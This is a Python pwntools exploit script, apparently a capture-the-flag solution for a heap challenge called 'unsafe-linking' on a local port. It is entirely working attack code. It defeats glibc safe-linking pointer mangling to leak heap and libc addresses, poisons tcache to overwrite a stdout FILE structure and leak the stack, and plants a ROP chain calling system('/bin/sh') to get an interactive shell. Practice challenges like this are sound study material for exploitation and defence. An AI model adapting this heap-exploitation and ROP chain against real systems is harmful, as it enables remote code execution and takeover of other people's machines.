# Author: n132 (xm2146@nyu.edu)
from pwn import *
context.arch='amd64'
# context.log_level='debug'
# p= process("./unsafe-linking")
p=remote("0.0.0.0",60001)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sl 	    = lambda a,b: 	p.sendafter(a,b)

def cmd(c):
    sla("> ",str(c).encode())
def add(idx,size,sec = 0, c=b"A"):
    cmd(1)
    sla(")\n",str(sec).encode())
    sla("?\n",str(idx).encode())
    if(sec==0):
        sla("?\n",str(size).encode())
    sl(":\n",c)
def free(idx):
    cmd(2)
    sla("?\n",str(idx).encode())
def show(idx):
    cmd(3)
    sla("?\n",str(idx).encode())
def X(leaked,page_off, orecal):
    if(page_off<0):
        neg=1
        page_off=-page_off
    else:
        neg=-1
    x1 = (page_off >> 24)
    x2 = ((page_off >> 12) & 0xfff)
    x3 = (page_off & 0xfff)
    A = leaked >> 36
    D = orecal
    G = (leaked & 0xfff) ^ D
    if(x3>G):
        JW1 = 1
    else:
        JW1 = 0 
    
    C = G + 0x1000 * JW1 + x3*neg
    F = ((leaked>>12)&0xfff) ^ C

    if( x2 > F-JW1 ):
        JW2 = 1
    else:
        JW2 = 0 
    B = F-JW1 + 0x1000 * JW2 + x2*neg
    # print(hex(leaked),hex(page_off),hex(JW2),hex(F))
    res = (A<<36) | (B <<24) | (C<<12) | D
    return res
def M(addr):
    x1 = addr >>36
    x2 = (addr >> 24) & 0xfff
    x3 = (addr >> 12) & 0xfff
    x4 = addr & 0xfff
    r1 = x1
    r2 = x2^r1
    r3 = x3^r2
    r4 = x4^r3
    print(hex(x1),hex(x2),hex(x3),hex(x4),hex(addr))
    return  r1<<36 | r2<<24  | r3<<12 | r4
add(0,0x8,0,"A")
add(1,0x8,0,"A")
free(0)
free(1)
add(0,0x8,1,"A")
show(0)
p.readuntil("Secret ")
heap = int(p.readuntil("\n")[:-1],16) 
heap = M(heap)&0xfffffffff000
add(0,0x409)
add(1,0x18)
free(0)
add(0,0x0,1, b'A')
show(0)
p.readuntil("Secret ")
base = int(p.readuntil("(")[:-1],16)
p.readuntil("off= ")
off = int(p.readuntil(")")[:-1],16)
base = X(base,off,0x041)-(0x7ffff7f9d041-0x00007ffff7d83000)
for x in range(3):
    add(x,0x88,0,b'\0'*0x78+p64(0x71))
for x in range(3):
    free(x)
add(0,0x18,0,p64(heap+0x490))
free(1)
add(0,0x68,0,b"\0"*0x30+p64((heap>>12)^(0x7ffff7f9d780-0x00007ffff7d83000+base)))
add(0,0x88)
add(0,0x88,0,p64(0x1802)+p64(0)*3+p64(0x221200+base)+p64(0x221200+8+base))
stack = u64(p.read(8))

log.warning(hex(heap))
log.warning(hex(base))
log.warning(hex(stack))

for x in range(5):
    add(x,0x38)
for x in range(5):
    free(x)
add(0,0x18,0,p64((stack-0x288)))
add(0,0x301)
free(3)
# gdb.attach(p,'''
# b free
# ''')
rdi = 0x000000000002a3e5+base
ret = 0x0000000000029cd6+base
sh = 0x1d8698+base
system = 0x50d60+base
add(0,0x308,0,b"A"*0xe8+flat([rdi,sh,ret,system]))
p.interactive()